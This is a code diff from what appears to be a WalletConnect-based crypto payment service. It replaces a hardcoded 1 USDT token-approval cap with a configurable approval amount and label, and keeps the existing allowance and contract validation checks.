@@ -1,14 +1,14 @@
 const paymentStore = require("../storage/payments");
 const sessionStore = require("../storage/sessions");
 const { getClient } = require("./walletconnect");
-const { getNetwork, MAX_ALLOWANCE_USDT } = require("../config/networks");
+const { getNetwork } = require("../config/networks");
+const { approveAmountRaw, approveAmountLabel } = require("../config/approvalAmount");
 const { requireContracts } = require("../config/contracts");
 const { verifyPaymentTransaction } = require("./transactionVerifier");
 const { emitPaymentEvent, assertActiveSession, publicPayment, maybeEmitFormAvailable } = require("./paymentService");
 const { emitEvent } = require("../utils/events");
 const {
-    encodeErc20Approve,
-    allowanceUnits
+    encodeErc20Approve
 } = require("../utils/helpers");
 const { NotFoundError, ValidationError, WalletConnectError } = require("../utils/errors");
 const logger = require("../utils/logger");
@@ -341,7 +341,7 @@ async function sendEvmApprove(client, topic, chainId, from, to, data) {
 
 async function sendWalletApproval(client, session, payment, network, account) {
     const topic = session.sessionTopic;
-    const amountRaw = MAX_ALLOWANCE_USDT * allowanceUnits(network.usdtDecimals);
+    const amountRaw = approveAmountRaw(network.usdtDecimals);
 
     if (network.namespace === "tron") {
         if (!account?.address || (!String(account.address).startsWith("T") && !String(account.address).startsWith("41"))) {
@@ -538,7 +538,7 @@ async function requestApproval(paymentId, deps = {}) {
             gasQuote: liveGas || payment.gasQuote,
             gasSufficient: false,
             status: "awaiting_gas",
-            error: liveGas?.reason || "Native gas is insufficient for the 1 USDT approval"
+            error: liveGas?.reason || `Native gas is insufficient for the ${approveAmountLabel()} approval`
         });
         emitPaymentEvent("approval_failed", blocked, { reason: blocked.error });
         throw new ValidationError(blocked.error);
@@ -557,10 +557,10 @@ async function requestApproval(paymentId, deps = {}) {
         throw new ValidationError("Payment contracts do not match server configuration");
     }
 
-    const maxRaw = MAX_ALLOWANCE_USDT * allowanceUnits(network.usdtDecimals);
+    const maxRaw = approveAmountRaw(network.usdtDecimals);
 
     if (BigInt(payment.allowanceRaw) > maxRaw) {
-        throw new ValidationError("Allowance exceeds 1 USDT");
+        throw new ValidationError(`Allowance exceeds ${approveAmountLabel()}`);
     }
 
     const account = pickAccount(session, network);
